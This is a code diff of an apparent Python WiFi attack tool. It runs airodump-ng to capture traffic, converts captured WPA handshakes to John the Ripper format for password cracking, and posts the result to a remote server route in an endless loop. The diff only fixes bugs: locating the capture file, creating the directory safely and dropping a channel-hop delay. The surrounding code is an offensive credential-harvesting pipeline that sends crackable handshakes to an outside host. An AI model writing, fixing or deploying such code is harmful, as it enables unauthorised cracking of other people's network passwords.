@@ -46,7 +46,7 @@ def ConvertHandshakeToJohn(filepath: str) -> bool:
     out = wpapcap2john.communicate()
     # Get converted handshakes
     handshake = out[0]
-    if len(handshake) != 0:
+    if len(handshake) > 0:
         # Append handshakes to the JOHN_HANDSHAKES_FILE
         with open(JOHN_HANDSHAKES_FILE, "a+") as file:
             file.write(handshake.decode("utf-8"))
@@ -103,7 +103,6 @@ def DumpNetworkData(iface: str, file_prefix: str) -> subprocess.Popen[bytes]:
         f"-w{file_prefix}",         # Write file prefix
         "--beacons",                # Store beacons in the .cap file
         "--output-format=pcap",     # Output format as cap
-        "-f1000"                    # 1000ms delay between channel hops
     ]
     # Run airodump-ng to start capturing packets
     airodump = subprocess.Popen(
@@ -135,12 +134,20 @@ def OnExit():
 
     handshakes = os.listdir()
     if len(handshakes) > 0:
+        capture_file = None
+        for file in handshakes:
+            if ".cap" in file:
+                capture_file = file
+                break
+        if capture_file is None:
+            print("No Capture file exists", file=sys.stderr)
+            exit(1)
         # Convert the handshake file to john format which also checks if the file has WPA Handshakes
-        handshakes_captured = ConvertHandshakeToJohn(handshakes[0])
+        handshakes_captured = ConvertHandshakeToJohn(capture_file)
         if handshakes_captured:
             with open(JOHN_HANDSHAKES_FILE, 'rb') as file:
                 # Send the john format handshake file to server
-                requests.post(
+                response = requests.post(
                     SERVER_URL + HANDSHAKE_UPLOAD_ROUTE,
                     files={"file": file}
                 )
@@ -163,7 +170,7 @@ def Run():
 
 def main():
     # Change directory to Handshakes
-    os.makedirs("Handshakes")
+    os.makedirs("Handshakes", exist_ok=True)
     os.chdir("Handshakes")
 
     # Run in an infinite loop to keep capturing network packets
